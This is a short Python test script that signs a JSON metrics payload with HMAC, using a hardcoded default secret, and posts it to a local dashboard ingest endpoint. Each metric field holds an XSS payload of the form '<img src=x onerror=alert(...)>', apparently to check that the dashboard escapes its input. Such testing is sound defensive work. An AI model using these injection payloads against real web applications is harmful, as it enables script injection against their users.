import httpx
import hmac
import hashlib
import time
import json

API_URL = "http://localhost:8765/api/ingest"
SECRET = "sidecar-default-secret"

def send_payload(payload):
    timestamp = str(int(time.time()))
    body = json.dumps(payload).encode()
    
    signature = hmac.new(
        SECRET.encode(),
        f"{timestamp}".encode() + body,
        hashlib.sha256
    ).hexdigest()
    
    headers = {
        "X-Signature": signature,
        "X-Timestamp": timestamp,
        "Content-Type": "application/json"
    }
    
    try:
        r = httpx.post(API_URL, content=body, headers=headers)
        print(f"Status: {r.status_code}")
        print(f"Response: {r.text}")
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    payload = {
        "provider": "xss-test-2",
        "metrics": [
            {
                "service": "XSS Service \"><img src=x onerror=alert('XSS_SERVICE_ATTR')>",
                "remaining": "ERR <img src=x onerror=alert('XSS_REMAINING_TEXT')>",
                "unit": "tokens <img src=x onerror=alert('XSS_UNIT')>",
                "reset": "now <img src=x onerror=alert('XSS_RESET')>",
                "icon": "🛡️",
                "health": "critical",
                "pace": "Fast <img src=x onerror=alert('XSS_PACE')>",
                "detail": "Detailed payload <img src=x onerror=alert('XSS_DETAIL')>",
                "used_value": None, # Force fallback to item.remaining
                "limit_value": None,
                "is_unlimited": False,
                "unit_type": "generic",
                "data_source": "sidecar"
            }
        ]
    }
    send_payload(payload)
